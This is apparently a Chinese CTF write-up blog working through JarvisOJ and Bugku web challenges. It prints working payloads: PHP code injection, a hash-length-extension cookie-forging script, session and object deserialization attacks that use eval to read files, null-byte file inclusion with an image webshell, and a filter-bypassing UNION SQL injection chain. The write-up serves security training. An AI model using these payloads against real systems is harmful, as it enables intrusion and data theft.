attempt!&quot;</span>);</span><br><span class="line">assert(<span class="string">&quot;file_exists(&#x27;<span class="subst">$file</span>&#x27;)&quot;</span>) <span class="keyword">or</span> <span class="keyword">die</span>(<span class="string">&quot;That file doesn&#x27;t exist!&quot;</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>从泄露里可以看到有<code>flag.php</code>，猜测flag在里面</p><p>从源码里可以看到可以代码执行</p><p><strong>payload:</strong></p><pre><code>?page=&#39;^system(&#39;cat templates/flag.php&#39;)^&#39;</code></pre><p>得到flag</p><h2 id="61dctf-admin"><a href="#61dctf-admin" class="headerlink" title="[61dctf]admin"></a>[61dctf]admin</h2><p>打开题目网址：</p><p><img src="/2019/10/05/jarvisoj-web-wp/20190805174242.png"></p><p>dirsearch一扫</p><p><img src="/2019/10/05/jarvisoj-web-wp/20190805174301.png"></p><p>访问robots.txt</p><p><img src="/2019/10/05/jarvisoj-web-wp/20190805174319.png"></p><p>访问提示的内容</p><p><img src="/2019/10/05/jarvisoj-web-wp/20190805174340.png"></p><p>flag出来了？那么简单？就是那么简单</p><h2 id="LOCALHOST"><a href="#LOCALHOST" class="headerlink" title="LOCALHOST"></a>LOCALHOST</h2><p>打开题目网址：</p><p><img src="/2019/10/05/jarvisoj-web-wp/20190805144450.png"></p><p>仅本机访问，立刻想到抓包改XFF</p><p><img src="/2019/10/05/jarvisoj-web-wp/20190805144941.png"></p><p>flag就这样出来了，是不是很简单？就是这样简单</p><pre><code>PCTF&#123;X_F0rw4rd_F0R_is_not_s3cuRe&#125; </code></pre><h2 id="flag在管理员手里"><a href="#flag在管理员手里" class="headerlink" title="flag在管理员手里"></a>flag在管理员手里</h2><p>打开提示<code>Only Admin can see the flag!!</code></p><p>抓包看下，很明显问题的入手点在Cookie这里</p><p><img src="/2019/10/05/jarvisoj-web-wp/20191213221259.png"></p><p>url解码发现是</p><p><img src="/2019/10/05/jarvisoj-web-wp/20191213221518.png"></p><p>改下guest重新发包发现没反应，应该和hsh有关系</p><p>没什么思路，就扫下路径吧，dirsearch扫到备份文件<code>index.php~</code>，但打开发现不能看到源码</p><p>猜测是vi异常退出的文件，第一次异常退出会产生一个<code>*.swp</code>，再次意外退出后，将会产生名为<code>*.swo</code>的交换文件；而第三次产生的交换文件则为<code>*.swn</code>的文件，依此类推。</p><p>可以直接用<code>vim -r</code>恢复文件</p><p><img src="/2019/10/05/jarvisoj-web-wp/20191213221518.png"></p><p>恢复出来的关键代码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line">$auth = <span class="literal">false</span>;</span><br><span class="line">$role = <span class="string">&quot;guest&quot;</span>;</span><br><span class="line">$salt = </span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_COOKIE[<span class="string">&quot;role&quot;</span>])) &#123;</span><br><span class="line">$role = unserialize($_COOKIE[<span class="string">&quot;role&quot;</span>]);</span><br><span class="line">$hsh = $_COOKIE[<span class="string">&quot;hsh&quot;</span>];</span><br><span class="line"><span class="keyword">if</span> ($role===<span class="string">&quot;admin&quot;</span> &amp;&amp; $hsh === md5($salt.strrev($_COOKIE[<span class="string">&quot;role&quot;</span>]))) &#123;</span><br><span class="line">$auth = <span class="literal">true</span>;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">$auth = <span class="literal">false</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">$s = serialize($role);</span><br><span class="line">setcookie(<span class="string">&#x27;role&#x27;</span>,$s);</span><br><span class="line">$hsh = md5($salt.strrev($s));</span><br><span class="line">setcookie(<span class="string">&#x27;hsh&#x27;</span>,$hsh);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> ($auth) &#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;h3&gt;Welcome Admin. Your flag is </span></span><br><span class="line"><span class="string">&#125; else &#123;</span></span><br><span class="line"><span class="string">echo &quot;</span>&lt;h3&gt;Only Admin can see the flag!!&lt;/h3&gt;<span class="string">&quot;;</span></span><br><span class="line"><span class="string">&#125;</span></span><br><span class="line"><span class="string">?&gt;</span></span><br></pre></td></tr></table></figure><p>这段代码的意思就是反序列化Cookie里的role，将salt(未知)和反转后的role拼接一起并MD5加密，然后与Cookie里的hash比较，相等就会输出flag</p><p>这就要用到hash扩展攻击的知识参见我的另外一篇博客：<a href="https://www.moonback.xyz/2019/12/16/hash-extend-attack/">https://www.moonback.xyz/2019/12/16/hash-extend-attack/</a></p><p>由于我们不知道$salt的长度，所以我们需要对其长度爆破，爆破之前，我们需要知道的是反序列化函数存在00截断，为保证<code>$role===&quot;admin&quot;</code>，我们必须<code>s:5:&quot;guest&quot;;</code>在前面，注意服务端在md5加密的是反转的role的键值。所以我们构造的payload应该为以下内容，最终知道salt的长度为12(0c)</p><p><img src="/2019/10/05/jarvisoj-web-wp/0191230142702.png"></p><p>这里有个脚本，需要装个hashpumpy库</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> hashpumpy</span><br><span class="line"><span class="keyword">import</span> urllib</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url=<span class="string">&#x27;http://web.jarvisoj.com:32778/&#x27;</span></span><br><span class="line">hsh=<span class="string">&#x27;3a4727d57463f122833d9e732f94e4e0&#x27;</span></span><br><span class="line">s1=<span class="string">&#x27;&#x27;&#x27;s:5:&quot;guest&quot;;&#x27;&#x27;&#x27;</span></span><br><span class="line">s2=<span class="string">&#x27;&#x27;&#x27;s:5:&quot;admin&quot;;&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">30</span>):</span><br><span class="line">m=hashpumpy.hashpump(hsh,s1[::<span class="number">-1</span>],s2[::<span class="number">-1</span>],i)</span><br><span class="line">    <span class="comment"># 四个参数分别为 hash值 secret后的字符串 更改后secret后的字符串 secret的长度 </span></span><br><span class="line"><span class="keyword">print</span> i</span><br><span class="line">Cookie=<span class="string">&quot;role=&quot;</span>+urllib.quote(urllib.unquote(m[<span class="number">1</span>])[::<span class="number">-1</span>])+<span class="string">&quot;; hsh=&quot;</span>+m[<span class="number">0</span>]</span><br><span class="line">headers=&#123;<span class="string">&quot;Cookie&quot;</span>:Cookie&#125;</span><br><span class="line">r=requests.get(url,headers=headers)</span><br><span class="line"><span class="keyword">if</span> <span class="string">&quot;Welcome&quot;</span> <span class="keyword">in</span> r.text:</span><br><span class="line"><span class="keyword">print</span> r.text;</span><br><span class="line"><span class="keyword">break</span></span><br></pre></td></tr></table></figure><h2 id="PHPINFO"><a href="#PHPINFO" class="headerlink" title="PHPINFO"></a>PHPINFO</h2><p>拿到题是这样的</p><p><img src="/2019/10/05/jarvisoj-web-wp/20191105200834.png"></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">&#x2F;&#x2F;A webshell is wait for you</span><br><span class="line">ini_set(&#39;session.serialize_handler&#39;, &#39;php&#39;);</span><br><span class="line">session_start();</span><br><span class="line">class OowoO</span><br><span class="line">&#123;</span><br><span class="line">    public $mdzz;</span><br><span class="line">    function __construct()</span><br><span class="line">    &#123;</span><br><span class="line">        $this-&gt;mdzz &#x3D; &#39;phpinfo();&#39;;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    function __destruct()</span><br><span class="line">    &#123;</span><br><span class="line">        eval($this-&gt;mdzz);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">if(isset($_GET[&#39;phpinfo&#39;]))</span><br><span class="line">&#123;</span><br><span class="line">    $m &#x3D; new OowoO();</span><br><span class="line">&#125;</span><br><span class="line">else</span><br><span class="line">&#123;</span><br><span class="line">    highlight_string(file_get_contents(&#39;index.php&#39;));</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>既然题目告诉我们phpinfo,我们就尝试访问一下,发现果然存在</p><p>从phpinfo能看出来好多东西，这里就不绕弯子了</p><p>本题考察的就是session反序列化的知识</p><p><img src="/2019/10/05/jarvisoj-web-wp/20191105201933.png"></p><p><code>session.save_path</code>是指session的存储路径，如果是<code>no value</code>，那么将会是默认路径<code>/tmp/sess_**</code></p><p><code>session.serialize_handler</code>是指session的序列化引擎。<code>Master Value</code>是PHP.ini文件中的内容，<code>Local value</code> 是当前目录中的设置，这个值会覆盖<code>Master Value</code>中对应的值</p><p><code>session.upload_progress.cleanup</code>这个是指session上传进度是否自动清除的选项</p><p>可以看下<a href="https://www.php.net/manual/zh/session.upload-progress.php">手册</a></p><p><img src="/2019/10/05/jarvisoj-web-wp/20191105203115.png"></p><p>大概意思就是，如果session上传进度开启的话，可以POST一个<code>PHP_SESSION_UPLOAD_PROGRESS</code>变量，上传进度会保存在<code>$_SESSION</code>中，然后通过php序列化引擎的不同来导致漏洞（session的写入会序列化，session的读取会反序列化）</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">class OowoO</span><br><span class="line">&#123;</span><br><span class="line">    public $mdzz;</span><br><span class="line">    function __construct()</span><br><span class="line">    &#123;</span><br><span class="line">        $this-&gt;mdzz &#x3D; &#39;恶意代码&#39;;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    function __destruct()</span><br><span class="line">    &#123;</span><br><span class="line">        eval($this-&gt;mdzz);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">$a&#x3D;new OowoO();</span><br><span class="line">echo serialize($a);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>序列化的结果</p><pre><code>O:5:&quot;OowoO&quot;:1:&#123;s:4:&quot;mdzz&quot;;s:16:&quot;恶意代码&quot;;&#125;    //长度修改下</code></pre><p>这里我们用下面这个网页构造</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;form action&#x3D;&quot;http:&#x2F;&#x2F;web.jarvisoj.com:32784&#x2F;index.php&quot; method&#x3D;&quot;POST&quot; enctype&#x3D;&quot;multipart&#x2F;form-data&quot;&gt;</span><br><span class="line">    &lt;input type&#x3D;&quot;hidden&quot; name&#x3D;&quot;PHP_SESSION_UPLOAD_PROGRESS&quot; value&#x3D;&quot;123&quot; &#x2F;&gt;</span><br><span class="line">    &lt;input type&#x3D;&quot;file&quot; name&#x3D;&quot;file&quot; &#x2F;&gt;</span><br><span class="line">    &lt;input type&#x3D;&quot;submit&quot; &#x2F;&gt;</span><br><span class="line">&lt;&#x2F;form&gt;</span><br></pre></td></tr></table></figure><p>抓包可以看到</p><p><img src="/2019/10/05/jarvisoj-web-wp/20191105230429.png"></p><p>从phpinfo可以看到网站路径是<code>/opt/lampp/htdocs</code>，然后在<code>filename</code>插入反序列化的内容</p><pre><code>|O:5:\&quot;OowoO\&quot;:1:&#123;s:4:\&quot;mdzz\&quot;;s:36:\&quot;print_r(scandir(dirname(__FILE__)));\&quot;;&#125;</code></pre><p><img src="/2019/10/05/jarvisoj-web-wp/20191105230751.png"></p><pre><code>|O:5:\&quot;OowoO\&quot;:1:&#123;s:4:\&quot;mdzz\&quot;;s:88:\&quot;print_r(file_get_contents(\&quot;/opt/lampp/htdocs/Here_1s_7he_fl4g_buT_You_Cannot_see.php\&quot;));\&quot;;&#125;</code></pre><p><img src="/2019/10/05/jarvisoj-web-wp/20191105230850.png"></p><h2 id="api调用"><a href="#api调用" class="headerlink" title="api调用"></a>api调用</h2><p>这题就是一个简单的xxe</p><p>抓包将<code>Content-Type</code>改成<code>application/xml</code>，POST区添加而已xml就行</p><p><img src="/2019/10/05/jarvisoj-web-wp/20191216161236.png"></p><h2 id="Easy-Gallery"><a href="#Easy-Gallery" class="headerlink" title="Easy Gallery"></a>Easy Gallery</h2><p>打开题目，发现有三个页面</p><p>切换一下发现有page这个参数，瞬间想到了文件包含</p><p>试试index.php</p><p><img src="/2019/10/05/jarvisoj-web-wp/20191216155606.png"></p><p>发现是fopen函数，想到了%00截断，试试吧</p><p>构造类似的payload：</p><pre><code>index.php?page=uploads/1576482315.gif%00</code></pre><p>上传一个gif/jpg图片马，发现</p><p><img src="/2019/10/05/jarvisoj-web-wp/20191216160332.png"></p><p>对<code>&lt;?php</code>或<code>?&gt;</code>做了过滤?</p><p>试试<code>&lt;script language=&#39;php&#39;&gt;&lt;/script&gt;</code>吧</p><p><img src="/2019/10/05/jarvisoj-web-wp/20191216160559.png"></p><p>得到flag，感觉View功能都没用上2333…..</p><h2 id="IN-A-Mess"><a href="#IN-A-Mess" class="headerlink" title="IN A Mess"></a>IN A Mess</h2><p>打开题目网址：</p><p><img src="/2019/10/05/jarvisoj-web-wp/20190805154705.png"></p><p>看到id=1，第一时间想到注入，很可惜不是注入</p><p>查看源代码看到有个提示，访问一下</p><p>得到一大串代码，排版一下</p><p><img src="/2019/10/05/jarvisoj-web-wp/20190805155051.png"></p><p>传入三个参数，id,a,b</p><p>id值等于0但自身不能为0,可以弱类型比较</p><p>a涉及file_get_contents，需用伪协议<code>php://input</code>传入”<code>1112 is a nice lab!</code>”</p><p>b长度大于5且可能涉及eregi绕过，可以用%00截断</p><pre><code>payload1:?id=0.&amp;a=php://input&amp;b=%000x34aa  并post个1112 is a nice lab!payload2:?id=0e&amp;a=data:,1112 is a nice lab!&amp;b=%00411111</code></pre><p>关于payload2中data:后为什么有逗号，具体参见：<br><a href="https://blog.csdn.net/qq1045553189/article/details/87479691">https://blog.csdn.net/qq1045553189/article/details/87479691</a></p><p><img src="/2019/10/05/jarvisoj-web-wp/20190805161344.png"></p><p>本以为得到了flag,提交发现错误，再看看500大分的题，应该不会那么简单，<br>再战</p><p>也不绕弯子了，直接访问我们我们得到的信息，果然有这个网页，不要问我为什么&gt;_&lt;</p><p><img src="/2019/10/05/jarvisoj-web-wp/20190805161938.png"></p><p>又看到id=1了，再次想到注入，这次对了，加个/,发现</p><p><img src="/2019/10/05/jarvisoj-web-wp/20190805162126.png"></p><p>尝试id=2-1,发现返回还是id=1的结果，说明代入执行了，存在注入<br>回显为如果检测到注入就返回you bad boy/girl!，如果执行了查询不到结果就返回执行语句</p><p>order by 判断列数，发现被过滤了，</p><p><img src="/2019/10/05/jarvisoj-web-wp/20190805163827.png"></p><p>将空格替换成/**/发现也被过滤了，将空格替换为/<em>1</em>/，返回hi666</p><p>当为4时报错，只有三列，联合查询判断回显位，发现发现union,select,from都被替换为空了，双写即可绕过</p><pre><code>?id=-1/*1*/ununionion/*1*/selselectect/*1*/1,database(),3%23</code></pre><p>执行发现回显3，说明第三个位置为回显位</p><pre><code>?id=-1/*1*/ununionion/*1*/selselectect/*1*/1,2,database()%23</code></pre><p>爆出数据库test</p><pre><code>?        id=-1/*1*/ununionion/*1*/selselectect/*1*/1,2,group_concat(table_name)/*1*/frfromom/*1*/information_schema.tables/*1*/where/*1*/table_schema=database()%23</code></pre><p>爆出表为content</p><pre><code>?id=-1/*1*/ununionion/*1*/selselectect/*1*/1,2,group_concat(column_name)/*1*/frfromom/*1*/information_schema.columns/*1*/where/*1*/table_schema=database()#</code></pre><p>爆出字段id,context,title</p><pre><code>?id=-1/*1*/ununionion/*1*/selselectect/*1*/1,2,group_concat(id,0x23,context,0x23,title)/*1*/frfromom/*1*/test.content#</code></pre><p><img src="/2019/10/05/jarvisoj-web-wp/20190805173153.png"></p><pre><code>PCTF&#123;Fin4lly_U_got_i7_C0ngRatulation5&#125;</code></pre><h2 id="神盾局的秘密"><a href="#神盾局的秘密" class="headerlink" title="神盾局的秘密"></a>神盾局的秘密</h2><p>打开题目，发现是一张图片，Ctrl+U查看源码发现</p><p><img src="/2019/10/05/jarvisoj-web-wp/20191210222517.png"></p><p>猜测img传的东西是base64加密的，解密以下发现是<code>shield.jpg</code>，换成其他<code>/etc/passwd</code>发现不行，尝试包含<code>index.php</code>,<code>showimg.php</code>,<code>shield.php</code></p><p><strong>index.php:</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="keyword">require_once</span>(<span class="string">&#x27;shield.php&#x27;</span>);</span><br><span class="line">$x = <span class="keyword">new</span> Shield();</span><br><span class="line"><span class="keyword">isset</span>($_GET[<span class="string">&#x27;class&#x27;</span>]) &amp;&amp; $g = $_GET[<span class="string">&#x27;class&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span> (!<span class="keyword">empty</span>($g)) &#123;</span><br><span class="line">$x = unserialize($g);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">echo</span> $x-&gt;readfile();</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><strong>showing.php:</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$f = $_GET[<span class="string">&#x27;img&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span> (!<span class="keyword">empty</span>($f)) &#123;</span><br><span class="line">$f = base64_decode($f);</span><br><span class="line"><span class="keyword">if</span> (stripos($f,<span class="string">&#x27;..&#x27;</span>)===<span class="literal">FALSE</span> &amp;&amp; stripos($f,<span class="string">&#x27;/&#x27;</span>)===<span class="literal">FALSE</span> &amp;&amp; stripos($f,<span class="string">&#x27;\\&#x27;</span>)===<span class="literal">FALSE</span></span><br><span class="line">&amp;&amp; stripos($f,<span class="string">&#x27;pctf&#x27;</span>)===<span class="literal">FALSE</span>) &#123;</span><br><span class="line">readfile($f);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;File not found!&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><strong>shield.php:</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">//flag is in pctf.php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Shield</span> </span>&#123;</span><br><span class="line"><span class="keyword">public</span> $file;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params">$filename = <span class="string">&#x27;&#x27;</span></span>) </span>&#123;</span><br><span class="line"><span class="keyword">$this</span> -&gt; file = $filename;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">readfile</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line"><span class="keyword">if</span> (!<span class="keyword">empty</span>(<span class="keyword">$this</span>-&gt;file) &amp;&amp; stripos(<span class="keyword">$this</span>-&gt;file,<span class="string">&#x27;..&#x27;</span>)===<span class="literal">FALSE</span>  </span><br><span class="line">&amp;&amp; stripos(<span class="keyword">$this</span>-&gt;file,<span class="string">&#x27;/&#x27;</span>)===<span class="literal">FALSE</span> &amp;&amp; stripos(<span class="keyword">$this</span>-&gt;file,<span class="string">&#x27;\\&#x27;</span>)==<span class="literal">FALSE</span>) &#123;</span><br><span class="line"><span class="keyword">return</span> @file_get_contents(<span class="keyword">$this</span>-&gt;file);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>可以知道flag在<code>pctf.php</code>中，但过滤了pctf，不能直接包含<code>pctf.php</code></p><p><strong>构造反序列化序列：</strong></p><p><img src="/2019/10/05/jarvisoj-web-wp/20191210223726.png"></p><p>payload:</p><pre><code>index.php?class=O:6:&quot;Shield&quot;:1:&#123;s:4:&quot;file&quot;;s:8:&quot;pctf.php&quot;;&#125;</code></pre><p>查看源码得到flag</p><p><img src="/2019/10/05/jarvisoj-web-wp/20191210224319.png"></p><h2 id="Login"><a href="#Login" class="headerlink" title="Login"></a>Login</h2><p>打开题目网址：</p><p><img src="/2019/10/05/jarvisoj-web-wp/20190805145436.png"></p><p>好像没什么思路啊，抓包看看吧</p><p><img src="/2019/10/05/jarvisoj-web-wp/20190805145633.png"></p><p>看到响应头中有个提示</p><pre><code>&quot;select * from `admin` where password=&#39;&quot;.md5($pass,true).&quot;&#39;&quot;</code></pre><p><strong>md5()函数</strong>有两个参数</p><p>参数一是要加密的字符串；</p><p>参数二是输出格式：为true时，表示输出原始16字符二进制格式；<br>默认为false，表示输出32字符十六进制数。</p><p>看到提示第一时间想到注入,可是如何闭合sql语句呢？如果找到一个字符串MD5加密后得到的原始二进制格式在SQL中拼接成 类似 ‘or’xxx的形式就可以绕过了</p><p>将<code>ffifdyop</code>提交flag就出来了</p><pre><code>PCTF&#123;R4w_md5_is_d4ng3rous&#125;</code></pre><h2 id="LOCALHOST-1"><a href="#LOCALHOST-1" class="headerlink" title="LOCALHOST"></a>LOCALHOST</h2><p>打开题目网址：</p><p><img src="/2019/10/05/jarvisoj-web-wp/20190805144450.png"></p><p>仅本机访问，立刻想到抓包改XFF</p><p><img src="/2019/10/05/jarvisoj-web-wp/20190805144941.png"></p><p>flag就这样出来了，是不是很简单？就是这样简单</p><pre><code>PCTF&#123;X_F0rw4rd_F0R_is_not_s3cuRe&#125;</code></pre><h2 id="PORT51"><a href="#PORT51" class="headerlink" title="PORT51"></a>PORT51</h2><p>打开题目网址可以发现：</p><p><img src="/2019/10/05/jarvisoj-web-wp/20190805141505.png"></p><p>它让我们用51端口访问这个网址</p><p>看其他大佬的wp用的是curl命令，打开虚拟机咱也试下吧</p><pre><code>curl –local-port http://web.jarvisoj.com:32770/</code></pre><p><img src="/2019/10/05/jarvisoj-web-wp/20190805143017.png"></p><p>神魔情况？又看了看几位大佬的博客，说是必须要用公网IP的主机才行。不太死心，又试了试cmd里的，果然还是不行。</p><p>查看了众多大佬的博客后得出的原因好像是：本地私有地址从代理服务器出去后，使用的是代理服务器的端口，这个端口往往不会是51，我用的是校园网，虚拟机也是经过主机走的校园网，所以。。。。</p><p>没办法只能抄别人的flag了</p><pre><code>PCTF&#123;M45t3r_oF_CuRl&#125;    </code></pre>]]></content>
      
      
      
        <tags>
            
            <tag> writeup </tag>
            
            <tag> web </tag>
            
            <tag> ctf </tag>
            
            <tag> jarvisoj </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>bugku web部分题目writeup</title>
      <link href="2019/10/01/bugku-web-partquestion/"/>
      <url>2019/10/01/bugku-web-partquestion/</url>
      
        <content type="html"><![CDATA[<p>本篇博客介绍了bugku中web部分题的writeup,感觉这些题自己收获还挺多的，包括以下题目：</p><ol><li>cookies欺骗</li><li>welcome to bugkuctf<a id="more"></a></li></ol><h2 id="cookies欺骗"><a href="#cookies欺骗" class="headerlink" title="cookies欺骗"></a>cookies欺骗</h2><p>打开题目是这样的：</p><p><img src="/2019/10/01/bugku-web-partquestion/20190915152012.png"></p><pre><code>http://123.206.87.240:8002/web11/index.php?line=&amp;filename=a2V5cy50eHQ=</code></pre><p>会自动跳转到这个url,<code>a2V5cy50eHQ=</code>很想base64加密后的结果，解密一下发现解密结果为<code>keys.txt</code>，显然filename这个参数传的是文件名字base64加密后的结果，是否可以传输index.php加密的结果呢？</p><p>index.php经base64加密后为<code>aW5kZXgucGhw</code>，试着访问一下</p><pre><code>http://123.206.87.240:8002/web11/index.php?line=&amp;filename=aW5kZXgucGhw</code></pre><p>发现内容为空白，查看源代码，发现有个</p><pre><code>&lt;?php</code></pre><p>将line=2发现</p><pre><code>$file=base64_decode(isset($_GET[&#39;filename&#39;])?$_GET[&#39;filename&#39;]:&quot;&quot;);</code></pre><p>看来思路对了，line代表的就是行数，写个脚本看下吧</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line">urls&#x3D;[&quot;http:&#x2F;&#x2F;123.206.87.240:8002&#x2F;web11&#x2F;index.php?line&#x3D;&#123;&#125;&amp;filename&#x3D;aW5kZXgucGhw&quot;.format(str(i))for i in range(100)]</span><br><span class="line">li&#x3D;&quot;&quot;</span><br><span class="line">for url in urls:</span><br><span class="line">    r&#x3D;requests.get(url)</span><br><span class="line">    if r.status_code&#x3D;&#x3D;200:</span><br><span class="line">        li+&#x3D;(r.text)</span><br><span class="line">print(li)</span><br></pre></td></tr></table></figure><p>因为不知道有多少行代码，先设成100吧，跑下，得到以下代码</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">error_reporting(0);</span><br><span class="line">$file&#x3D;base64_decode(isset($_GET[&#39;filename&#39;])?$_GET[&#39;filename&#39;]:&quot;&quot;);</span><br><span class="line">$line&#x3D;isset($_GET[&#39;line&#39;])?intval($_GET[&#39;line&#39;]):0;</span><br><span class="line">if($file&#x3D;&#x3D;&#39;&#39;) header(&quot;location:index.php?line&#x3D;&amp;filename&#x3D;a2V5cy50eHQ&#x3D;&quot;);</span><br><span class="line">$file_list &#x3D; array(</span><br><span class="line">&#39;0&#39; &#x3D;&gt;&#39;keys.txt&#39;,</span><br><span class="line">&#39;1&#39; &#x3D;&gt;&#39;index.php&#39;,</span><br><span class="line">);</span><br><span class="line">if(isset($_COOKIE[&#39;margin&#39;]) &amp;&amp; $_COOKIE[&#39;margin&#39;]&#x3D;&#x3D;&#39;margin&#39;)&#123;</span><br><span class="line">$file_list[2]&#x3D;&#39;keys.php&#39;;</span><br><span class="line">&#125;</span><br><span class="line">if(in_array($file, $file_list))&#123;</span><br><span class="line">$fa &#x3D; file($file);</span><br><span class="line">echo $fa[$line];</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>观察代码可知需要设置Cookie,还有个特殊文件<code>keys.php</code>,可能flag就在这个文件中，文件名base64加密后是<code>a2V5cy5waHA=</code></p><p><code>in_array()</code>函数用于搜索数组中是否存在指定的值，抓包看下</p><p><img src="/2019/10/01/bugku-web-partquestion/20190915160225.png"></p><pre><code>payload:/web11/index.php?line=&amp;filename=a2V5cy5waHA=设置Cookie: margin=margin</code></pre><p>得到flag</p><pre><code>KEY&#123;key_keys&#125;</code></pre><h2 